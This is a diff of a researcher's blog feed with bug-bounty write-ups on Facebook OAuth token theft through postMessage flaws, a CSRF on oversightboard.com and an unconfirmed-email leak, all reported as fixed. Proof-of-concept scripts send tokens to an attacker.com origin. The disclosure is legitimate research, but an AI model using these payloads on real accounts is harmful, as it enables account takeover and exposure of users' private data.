-                fullmsg = {xdArbiterHandleMessage:true,message:"FB_RPC:" + msg , origin: IFRAME_ORIGIN}
-window.parent.postMessage(fullmsg,"*");</code></pre>
-<p><!-- /wp:code --></p>
-<p><!-- wp:paragraph --></p>
-<p>Interested parts to manipulate are : <br>- <strong>IFRAME_ORIGIN</strong>, which is the one to be used in the redirect_uri parameter send with the POST request to apps.facebook.com/dialog/oauth to be verified server-side that it's a domain owned by the application requesting an access_token, then would be used as targetOrigin in postMessage  to send a cross window message to the iframe with the access_token<br>- Keys and values of the object inside <strong>params</strong> , there are the parameters to be appended to <meta http-equiv="content-type" content="text/html; charset=utf-8">apps.facebook.com/dialog/oauth. Most interesting ones are redirect_uri ( which can replace <meta http-equiv="content-type" content="text/html; charset=utf-8"><strong>IFRAME_ORIGIN</strong> in the POST request in some cases ) and <meta http-equiv="content-type" content="text/html; charset=utf-8"><strong>APP_ID</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>Attacks vectors/scenarios</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>What we'll do here is to try to instead of requesting an access token for the game application we own, we'll try to get one of a Facebook first party application like Instagram. What's holding us back is although we control the <meta http-equiv="content-type" content="text/html; charset=utf-8">IFRAME_ORIGIN and <meta http-equiv="content-type" content="text/html; charset=utf-8">APP_ID which we can set to match the Instagram application as www.instagram.com and 124024574287414, later the message sent to the iframe containing the first party access token would have a targetOrigin in postMessage as www.instagram.com which is not our window origin. Facebook did a good job protecting against these attacks ( i'll argue though to why not using the origin from the event message received and matching app_id to the hosted game instead of giving us total freedom which could have prevented all these bugs ), but apparently they left some weaknesses that could have been exploited for many years.      </p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph {"fontSize":"large"} --></p>
-<p class="has-large-font-size"><strong>Bug 1: Parameter Pollution, it was checked server-side and we <strong>definitely</strong> should trust it</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>This bug occurs due to the fact that the POST request to&nbsp;<strong>https://apps.facebook.com/dialog/oauth</strong>&nbsp;when constructed from the received message from the iframe, could contain user controlled parameters. <br>All parameters are checked in the client-side ( PlatformAppController, showDialog method and ,PlatformDialogClient.async method) and duplicate parameters will be removed in PlatformAppController , also AsyncRequest module seems to be doing some filtering ( removing parameters that already exist but brackets were appended to it ). <br><br>However due to some missing checking in the server-side, a parameter name set to <strong>PARAM[random</strong> would replace a previously set parameter <strong>PARAM</strong> ; for example <strong>redirect_uri[0</strong> parameter value would replace <strong>redirect_uri</strong>. We can abuse this as follow : <br>1) Set <strong>APP_ID</strong> to be the Instagram application id. <br>2) The redirect_uri will be constructed in PlatformDialogClient.async (Line 72 ) using <meta http-equiv="content-type" content="text/html; charset=utf-8"><strong>IFRAME_ORIGIN</strong> ( will end up <strong>https://www.facebook.com/dialog/return/arbiter#origin=https://attacker.com</strong> ) , which would be sent matching our iframe window origin but won't be used at all as explained below. <br>3) Set <strong>redirect_uri[0</strong> in <strong>params</strong> as an additional parameter ( order matters so it must be after <strong>redirect_uri</strong> ) to be <strong>https://www.instagram.com/accounts/signup</strong>/ which is a valid redirect_uri for the Instagram applicaiton.<br>The URL of the POST request end up being something like this:</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:code --></p>
-<pre class="wp-block-code"><code lang="javascript" class="language-javascript">https://apps.facebook.com/dialog/oauth?state=f36be3f648ddfb&amp;display=async&amp;redirect_uri=https://www.facebook.com/dialog/return/arbiter#origin=https://attacker.com&amp;app_id=124024574287414&amp;client_id=124024574287414&amp;response_type=token&amp;redirect_uri[0=https://www.instagram.com/accounts/signup/</code></pre>
-<p><!-- /wp:code --></p>
-<p><!-- wp:paragraph --></p>
-<p>The request would end up being successful and returning a first party access token since <meta http-equiv="content-type" content="text/html; charset=utf-8">redirect_uri[0 replaces redirect_uri and it's a valid redirect_uri. In the client side though, the logic is if an access_token was received it means that the origin used to construct the redirect_uri did work with the app_id and for that it should trust it and use to send the message to the iframe, behind the scenes though redirect_uri[0 was used and not redirect_uri ( Cool right?)<br><br><strong>Proof of concept</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:code --></p>
-<pre class="wp-block-code"><code lang="javascript" class="language-javascript"><meta http-equiv="content-type" content="text/html; charset=utf-8">xmsg = JSON.stringify({"jsonrpc":"2.0",
-                                    "method":"showDialog",
-                                    "id":1,
-                                    "params":[{"method":"permissions.oauth","display":"async","redirect_uri":"https://attacker.com/callback","app_id":"124024574287414","client_id":"<meta http-equiv="content-type" content="text/html; charset=utf-8">124024574287414","response_type":"token","redirect_uri[0":"https://www.instagram.com/accounts/signup/"}]})
-                fullmsg = {xdArbiterHandleMessage:true,message:"FB_RPC:" + xmsg , origin: "https://attacker.com"}
-window.parent.postMessage(fullmsg,"*");</code></pre>
-<p><!-- /wp:code --></p>
-<p><!-- wp:paragraph --></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph {"fontSize":"large"} --></p>
-<p class="has-large-font-size"><strong>Bug 2: Why bothering, Origin is undefined</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>The main problem for this one is that /dialog/oauth endpoint would accept&nbsp;<strong>https://www.facebook.com/dialog/return/arbiter</strong>&nbsp;as a valid redirect_uri ( without a valid origin in the fragment part ) for third-party applications and some first-party ones.<br>The second problem is that this behaviour to occur ( no origin in the fragment part ), the message sent from the iframe to&nbsp;<strong>apps.facebook.com</strong>&nbsp;should not contain a.data.origin ( <meta http-equiv="content-type" content="text/html; charset=utf-8"><strong>IFRAME_ORIGIN</strong> is undefined ) , however this same value would be used later to send a cross window message to the iframe, if <strong>null</strong> or <strong>undefined</strong> is used, the message won't be received. <br>Likely, i noticed that <strong>JSONRPC</strong> function would always receive a not null origin of the postMessage ( Line 55 ) . Since b.origin is undefined or null, <strong>k </strong>would be chosen. <strong>k</strong> could be set by the attacker by first registering a valid origin via <strong>c("Arbiter").subscribe("XdArbiter/register")</strong> which could be informed if our message had <strong>xdArbiterRegister</strong> and a specified origin . Before "<strong>k</strong>" variable is set, the supplied origin would be checked first if it belongs to the attacker application using "<strong>/platform/app_owned_url_check/</strong>" endpoint.<br>This is wrong and the second problem occurs here since we can't ensure that the user in the next cross origin message sent from the iframe would supply the same <strong>APP_ID</strong>.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>Not all first-party applications are vulnerable to this though. I used the Facebook Watch for Android application or Portal to get a first party access_token. </p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>The URL of the POST request would be something like this: </p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:code --></p>
-<pre class="wp-block-code"><code lang="javascript" class="language-javascript"><meta http-equiv="content-type" content="text/html; charset=utf-8">https://apps.facebook.com/dialog/oauth?state=f36be3f648ddfb&amp;display=async&amp;redirect_uri=<meta http-equiv="content-type" content="text/html; charset=utf-8">https://www.facebook.com/dialog/return/arbiter&amp;app_id=<meta http-equiv="content-type" content="text/html; charset=utf-8">1348564698517390&amp;client_id=<meta http-equiv="content-type" content="text/html; charset=utf-8">1348564698517390&amp;response_type=token</code></pre>
-<p><!-- /wp:code --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>Proof Of Concept</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:code --></p>
-<pre class="wp-block-code"><code lang="javascript" class="language-javascript">window.parent.postMessage({xdArbiterRegister:true,origin:"https://attacker.com"},"*")
-
-<meta http-equiv="content-type" content="text/html; charset=utf-8">xmsg = JSON.stringify({"jsonrpc":"2.0",
-                                    "method":"showDialog",
-                                    "id":1,
-                                    "params":[{"method":"permissions.oauth","display":"async","app_id":"1348564698517390","client_id":"<meta http-equiv="content-type" content="text/html; charset=utf-8">1348564698517390","response_type":"token"}]})
-                fullmsg = {xdArbiterHandleMessage:true,message:"FB_RPC:" + xmsg}
-window.parent.postMessage(fullmsg,"*");</code></pre>
-<p><!-- /wp:code --></p>
-<p><!-- wp:paragraph --></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph {"fontSize":"large"} --></p>
-<p class="has-large-font-size"><strong>Bug 3</strong>: <strong>Total</strong> <strong>Chaos</strong>, <strong>version can't be harmful</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>This bug one occurs in <strong>PlatformDialogClient.getURI</strong> function which is responsible of setting the API version before /dialog/oauth endpoint. This function didn't check for double dots or added paths and directly constructed a URI object to be used later to send an XHR request ( Line 86 ).<br>The <strong>version</strong> property in <strong>params</strong> passed in the cross window message sent to&nbsp;<strong>apps.facebook.com</strong>&nbsp;could be set to <strong>api/graphql/?doc_id=DOC_ID&amp;variables=VAR#</strong> and would eventually lead to a POST request sent to the GraphQL endpoint with valid user CSRF token.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>DOC_ID</strong> and <strong>VAR</strong> could be set to an id of a GraphQL Mutation to add a phone number to the attacount, and the variables of this mutation.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>The URL of the POST request would be something like this: </p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:code --></p>
-<pre class="wp-block-code"><code lang="javascript" class="language-javascript">https://apps.facebook.com/api/graphql?doc_id=DOC_ID&amp;variables=VAR&amp;?/dialog/oauth&amp;state=f36be3f648ddfb&amp;display=async&amp;redirect_uri=https://www.facebook.com/dialog/return/arbiter#origin=attacker&amp;app_id=1348564698517390&amp;client_id=1348564698517390&amp;response_type=token</code></pre>
-<p><!-- /wp:code --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>Proof Of Concept</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:code --></p>
-<pre class="wp-block-code"><code lang="javascript" class="language-javascript"><meta http-equiv="content-type" content="text/html; charset=utf-8">xmsg = JSON.stringify({"jsonrpc":"2.0",
-                                    "method":"showDialog",
-                                    "id":1,
-                                    "params":[{"method":"permissions.oauth","display":"async","client_id":"<meta http-equiv="content-type" content="text/html; charset=utf-8">APP_ID","response_type":"token","version":"<meta http-equiv="content-type" content="text/html; charset=utf-8">api/graphql?doc_id=DOC_ID&amp;variables=VAR&amp;"}]})
-                fullmsg = {xdArbiterHandleMessage:true,message:"FB_RPC:" + xmsg , origin: "https://attacker.com"}
-window.parent.postMessage(fullmsg,"*");</code></pre>
-<p><!-- /wp:code --></p>
-<p><!-- wp:paragraph --></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>Timeline</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:list {"ordered":true} --></p>
-<ol>
-<li>Aug 4, 2021&mdash; Report Sent <br><meta http-equiv="content-type" content="text/html; charset=utf-8">Aug 4, 2021&mdash;  Acknowledged by Facebook<br><meta http-equiv="content-type" content="text/html; charset=utf-8">Aug 6, 2021&mdash; Fixed by Facebook<br>Sep 2, 2021 &mdash; $42000 bounty  awarded by Facebook.</li>
-<li>Aug 9, 2021&mdash; Report Sent <br><meta http-equiv="content-type" content="text/html; charset=utf-8">Aug 9, 2021&mdash;  Acknowledged by Facebook<br><meta http-equiv="content-type" content="text/html; charset=utf-8">Aug 12, 2021&mdash; Fixed by Facebook<br>Aug 31, 2021 &mdash; $42000 bounty  awarded by Facebook.</li>
-<li>Aug 12, 2021&mdash; Report Sent <br><meta http-equiv="content-type" content="text/html; charset=utf-8">Aug 13, 2021&mdash;  Acknowledged by Facebook<br><meta http-equiv="content-type" content="text/html; charset=utf-8">Aug 17, 2021&mdash; Fixed by Facebook<br>Sep 2, 2021 &mdash; $42000 bounty  awarded by Facebook.</li>
-</ol>
-<p><!-- /wp:list --></p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Summery Facebook allowed online games owners to host their games/applications in apps.facebook.com for many years now. The idea and technology behind it was that the game ( Flash or HTML5 based) would be hosted in the owner website and later the website page hosting it should be shown to the Facebook user in apps.facebook.com inside a controlled iframe. Since the game is not hosted in Facebook and for best user experience like keeping score and profile data, Facebook had to establish a communication channel with the game owner to verify the identity of the Facebook user for example. This was ensured by using cross windows communication/messaging between apps.facebook.com and the game website inside the iframe. In this blog post, i'll be discussing multiple vulnerabilities i found in this implementation. Vulnerabilities potential These bugs were found after careful auditing of the client-side code inside apps.facebook.com responsible of verifying what's coming through this channel. The bugs explained below (and others) allowed me to takeover any Facebook account if the user decided to visit my game page inside apps.facebook.com. The severity of these bugs is high since these were present for years and billions of user and their information could have been compromised easily since this was served from inside Facebook. Facebook confirmed they didn't see any indicators of previous abuse or exploitation of these bugs. For Researchers Before explaining the actual bugs below, i tried to show the way i decomposed the code and a simplified path to track the flow of the message data and how its components will be used. I probably didn't left much to dig but i hope the information shared could help you in your research. If you are only interested in the bugs themselves then jump to each bug section part. Description So far we know that the game page being served inside an iframe in apps.facebook.com is communicating with the parent window to ask Facebook to do some actions. Among the requested actions , for example , is to show a dialog to the user that would allow him to confirm the usage of the Facebook application owned by the game developers which would help me to identify you and get some information from an access token that they'll receive if the user decided to user the application. The script responsible of receiving the cross window messages, interpreting them and understanding the action demanded is below ( only necessary parts are shown and as they were before the bugs were fixed ) : __d("XdArbiter", ... handleMessage: function(a, b, e) { d("Log").debug("XdArbiter at " + (window.name != null &amp;&amp; window.name !== "" ? window.name : window == top ? "top" : "[no name]") + " handleMessage " + JSON.stringify(a)); if (typeof a === "string" &amp;&amp; /^FB_RPC:/.test(a)) { k.enqueue([a.substring(7), { origin: b, source: e || i[h] }]); ... send: function(a, b, e) { var f = e in i ? e : h; a = typeof a === "string" ? a : c("QueryString").encode(a); b = b; try { d("SecurePostMessage").sendMessageToSpecificOrigin(b, a, e) } catch (a) { d("Log").error("XdArbiter: Proxy for %s not available, page might have been navigated: %s", f, a.message), delete i[f] } return !0 } ...]]></summary></entry><entry><title type="html">Oversightboard.com site-wide CSRF due to missing checking</title><link href="http://localhost:4000/uncategorized/2021/06/27/oversightboard-com-site-wide-csrf-due-to-missing-checking.html" rel="alternate" type="text/html" title="Oversightboard.com site-wide CSRF due to missing checking" /><published>2021-06-27T11:42:51+03:00</published><updated>2021-06-27T11:42:51+03:00</updated><id>http://localhost:4000/uncategorized/2021/06/27/oversightboard-com-site-wide-csrf-due-to-missing-checking</id><content type="html" xml:base="http://localhost:4000/uncategorized/2021/06/27/oversightboard-com-site-wide-csrf-due-to-missing-checking.html"><![CDATA[<p><!-- wp:paragraph --></p>
-<p><strong>Description</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>This bug could allow an attacker to force a user in&nbsp;<a rel="noreferrer noopener" href="https://oversightboard.com/" target="_blank">Oversightboard.com</a>&nbsp;who visited his website, to make certain requests which would allow the deleting, editing or creating of data. This is possible because the website&nbsp;<a rel="noreferrer noopener" href="https://www.oversightboard.com/" target="_blank">www.oversightboard.com</a>&nbsp;<!--more--> doesn't implement any security measurements like special token or headers to prevent CSRF attacks. The attacker would first exploit a Login CSRF bug which would force a Facebook or Instagram logged-in user to login in the&nbsp;<a rel="noreferrer noopener" href="https://www.oversightboard.com/" target="_blank">www.oversightboard.com</a>&nbsp;and then exploit the CSRF bug to make different actions.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>Details</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>The attacker would host those scripts in his website  (supposing the victim used oversightboard before so the login CSRF would work without user interaction):</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>oversight.html</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:code --></p>
-<pre class="wp-block-code"><code lang="markup" class="language-markup"><html>
-<body>
-<button onclick='window.open("oversight2.html","part2"); window.location.href = "<a rel="noreferrer noopener" href="https://www.facebook.com/v7.0/dialog/oauth?app_id=686247315210595&amp;redirect_uri=https%3A%2F%2Fwww.oversightboard.com%2Flogin%2F&amp;response_type=token" target="_blank">https://www.facebook.com/v7.0/dialog/oauth?app_id=686247315210595&amp;redirect_uri=https%3A%2F%2Fwww.oversightboard.com%2Flogin%2F&amp;response_type=token</a>";'>Start Attack</button>
-</body>
-</html></code></pre>
-<p><!-- /wp:code --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>oversight2.html</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:code --></p>
-<pre class="wp-block-code"><code lang="markup" class="language-markup"><html>
-<body>
-<form id="f" method="POST" action="<a rel="noreferrer noopener" href="https://www.oversightboard.com/graphql" target="_blank">https://www.oversightboard.com/graphql</a>">
-<input type="hidden" name="access_token" value="OB|2532996643404788|d9537588db572ef75a00175799aeaebc"/>
-<input type="hidden" name="__a" value="1"/>
-<input type="hidden" name="doc_id" value="REDACTED"/>
-<input type="hidden" name="variables" value='{"key":"val"}'/>
-<noscript>
-<input type="submit"/>
-</noscript>
-</form>
-<script>setTimeout(function(){document.getElementById("f").submit();},4000);</script>
-</body>
-</html></code></pre>
-<p><!-- /wp:code --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>Timeline</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>Dec 26, 2020&mdash; Report Sent <br>Jan 18, 2021&mdash;  Acknowledged by Facebook<br>Jan 29, 2021&mdash; Fixed by Facebook<br>Jan 29, 2021 &mdash; $500 bounty awarded by Facebook.</p>
-<p><!-- /wp:paragraph --></p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Description This bug could allow an attacker to force a user in&nbsp;Oversightboard.com&nbsp;who visited his website, to make certain requests which would allow the deleting, editing or creating of data. This is possible because the website&nbsp;www.oversightboard.com&nbsp; doesn't implement any security measurements like special token or headers to prevent CSRF attacks. The attacker would first exploit a Login CSRF bug which would force a Facebook or Instagram logged-in user to login in the&nbsp;www.oversightboard.com&nbsp;and then exploit the CSRF bug to make different actions. Details The attacker would host those scripts in his website (supposing the victim used oversightboard before so the login CSRF would work without user interaction): oversight.html https://www.facebook.com/v7.0/dialog/oauth?app_id=686247315210595&amp;redirect_uri=https%3A%2F%2Fwww.oversightboard.com%2Flogin%2F&amp;response_type=token";'>Start Attack oversight2.html https://www.oversightboard.com/graphql"> Timeline Dec 26, 2020&mdash; Report Sent Jan 18, 2021&mdash;  Acknowledged by FacebookJan 29, 2021&mdash; Fixed by FacebookJan 29, 2021 &mdash; $500 bounty awarded by Facebook.]]></summary></entry><entry><title type="html">Disclose unconfirmed email/phone of a Facebook user</title><link href="http://localhost:4000/uncategorized/2021/06/27/disclose-unconfirmed-email-phone-of-a-facebook-user.html" rel="alternate" type="text/html" title="Disclose unconfirmed email/phone of a Facebook user" /><published>2021-06-27T11:33:09+03:00</published><updated>2021-06-27T11:33:09+03:00</updated><id>http://localhost:4000/uncategorized/2021/06/27/disclose-unconfirmed-email-phone-of-a-facebook-user</id><content type="html" xml:base="http://localhost:4000/uncategorized/2021/06/27/disclose-unconfirmed-email-phone-of-a-facebook-user.html"><![CDATA[<p><!-- wp:paragraph {"fontSize":"normal"} --></p>
-<p class="has-normal-font-size"><strong>Description</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>This bug could have allowed an attacker to target Facebook users in order to potentially leak unconfirmed emails or phone numbers. A link should be visited by the targeted user in order for this to work. <!--more--> This happens because the endpoints&nbsp;<strong>https://www.facebook.com/n/</strong>&nbsp;and&nbsp;<strong>https://www.facebook.com/nd/&nbsp;</strong>would make certain redirects based on parameters supplied. This endpoint is mainly used in emails sent from Facebook for email/mobile confirmations or updates. If the combination of parameters "<strong>mid</strong>" and "<strong>code</strong>" are supplied, the endpoint would redirect to the path selected by the attacker (explained below) and append to it, unconfirmed or newly confirmed email (or phone number)</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>Details</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:list {"ordered":true} --></p>
-<ol>
-<li>The example link is as follow: https://www.facebook.com/n/<strong>?/billing_interfaces/external_result/&amp;mid=XXXXXXXX&amp;code=YYYYYYYY</strong></li>
-<li>The first parameter name would be the next path to redirect to and the one that should have the contactpoint appended to it.</li>
-<li><strong>XXXXXXXX</strong> is a string that would contain a hex encoded user id of the victim. It has this format:<br>AAAAAAAAAAAAA<strong>G</strong>5b011f85facd<strong>G</strong>1111111111111<strong>G</strong>AAA. Notice the second string if we use <strong>G</strong> as a separator "5b011f85facd". This should be replaced by a hex encoded user id. Here the random user id "100060381969101" was encoded which should be the target user id.<br><br>Notice that the <strong>mid</strong> parameter must contain the hex encoded user id which should match the Facebook logged-in user id (target). This could be achieved and exploited in two ways:<br>- We would firstly extract the user id of a target and then hex encoded before sending him/her the link.<br>- In order to this to work for any Facebook user that visits the attacker website, this could chained with another bug that would leak the Facebook user id of a website visitor.<br><br><strong>YYYYYYYY</strong> could be set randomly.</li>
-<li>If the previous condition is met ( encoded userid in mid matches the logged-in user id ), a redirect should be made to <strong>https://www.facebook.com<strong>/billing_interfaces/external_result/</strong></strong> with the parameter <strong>contactpoint</strong> containing any unconfirmed email/phone number. <br>The reason i chose <strong><strong>/billing_interfaces/external_result/</strong></strong> endpoint because it would return a script that would send the current URL with parameters to opener/parent window via postMessage. We should setup an eventListener for cross-window messages to catch it.<br><br><strong>Proof of concept</strong></li>
-</ol>
-<p><!-- /wp:list --></p>
-<p><!-- wp:code --></p>
-<pre class="wp-block-code"><code lang="markup" class="language-markup"><html>
-<head>
-<script>window.addEventListener("message",function a(event){alert(event.data.direct_debit_redirect_url.split("=")[2]);});</script>
-</head>
-<body>
-<iframe width="1" height="1" src="<strong>https://www.facebook.com/n/?/billing_interfaces/external_result/&amp;mid=AAAAAAAAAAAAAG5b011f85facdG1111111111111GAAA&amp;code=01</strong>"/>
-</body>
-</html></code></pre>
-<p><!-- /wp:code --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>Impact</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>This could be used to leak user unconfirmed email/phone number. As you may know, many Facebook users usually add an email which is never created and use phone number confirmation instead. This bug could open an attack surface for malicious users to know which email is added in the Facebook account and then create it. The second stage would be to confirm it by adding another script in the website visited by the victim. This would allow account takeovers of Facebook accounts.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>Timeline</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>Dec 20, 2020&mdash; Report Sent <br>Dec 29, 2020&mdash;  Acknowledged by Facebook<br>Feb 16, 2021 &mdash; $500 bounty awarded by Facebook (?).<br>Feb 23, 2021&mdash; Fixed by Facebook<br></p>
-<p><!-- /wp:paragraph --></p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Description This bug could have allowed an attacker to target Facebook users in order to potentially leak unconfirmed emails or phone numbers. A link should be visited by the targeted user in order for this to work. This happens because the endpoints&nbsp;https://www.facebook.com/n/&nbsp;and&nbsp;https://www.facebook.com/nd/&nbsp;would make certain redirects based on parameters supplied. This endpoint is mainly used in emails sent from Facebook for email/mobile confirmations or updates. If the combination of parameters "mid" and "code" are supplied, the endpoint would redirect to the path selected by the attacker (explained below) and append to it, unconfirmed or newly confirmed email (or phone number) Details The example link is as follow: https://www.facebook.com/n/?/billing_interfaces/external_result/&amp;mid=XXXXXXXX&amp;code=YYYYYYYY The first parameter name would be the next path to redirect to and the one that should have the contactpoint appended to it. XXXXXXXX is a string that would contain a hex encoded user id of the victim. It has this format:AAAAAAAAAAAAAG5b011f85facdG1111111111111GAAA. Notice the second string if we use G as a separator "5b011f85facd". This should be replaced by a hex encoded user id. Here the random user id "100060381969101" was encoded which should be the target user id.Notice that the mid parameter must contain the hex encoded user id which should match the Facebook logged-in user id (target). This could be achieved and exploited in two ways:- We would firstly extract the user id of a target and then hex encoded before sending him/her the link.- In order to this to work for any Facebook user that visits the attacker website, this could chained with another bug that would leak the Facebook user id of a website visitor.YYYYYYYY could be set randomly. If the previous condition is met ( encoded userid in mid matches the logged-in user id ), a redirect should be made to https://www.facebook.com/billing_interfaces/external_result/ with the parameter contactpoint containing any unconfirmed email/phone number. The reason i chose /billing_interfaces/external_result/ endpoint because it would return a script that would send the current URL with parameters to opener/parent window via postMessage. We should setup an eventListener for cross-window messages to catch it.Proof of concept https://www.facebook.com/n/?/billing_interfaces/external_result/&amp;mid=AAAAAAAAAAAAAG5b011f85facdG1111111111111GAAA&amp;code=01"/> Impact This could be used to leak user unconfirmed email/phone number. As you may know, many Facebook users usually add an email which is never created and use phone number confirmation instead. This bug could open an attack surface for malicious users to know which email is added in the Facebook account and then create it. The second stage would be to confirm it by adding another script in the website visited by the victim. This would allow account takeovers of Facebook accounts. Timeline Dec 20, 2020&mdash; Report Sent Dec 29, 2020&mdash;  Acknowledged by FacebookFeb 16, 2021 &mdash; $500 bounty awarded by Facebook (?).Feb 23, 2021&mdash; Fixed by Facebook]]></summary></entry></feed>
+<p><!-- wp:paragraph --></p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Description These bugs could allow malicious actors who owns Android Applications installed in the victim device alongside Facebook owned Android Applications ( Workplace, Facebook, Messenger .. ) to steal a first-party access token and use it to takeover the user Facebook/Workplace account. Details]]></summary></entry></feed>
